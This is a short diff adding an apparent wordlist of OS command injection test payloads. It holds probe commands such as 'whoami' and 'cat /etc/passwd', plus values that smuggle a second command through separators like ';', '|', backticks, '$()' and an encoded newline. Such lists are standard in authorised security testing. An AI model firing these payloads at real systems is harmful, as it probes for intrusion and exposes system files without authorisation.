@@ -1,0 +1,12 @@
+id
+whoami
+ls -la
+cat /etc/passwd
+uname -a
+sleep 5
+;id
+|whoami
+&&ls
+`whoami`
+$(id)
+%0a id
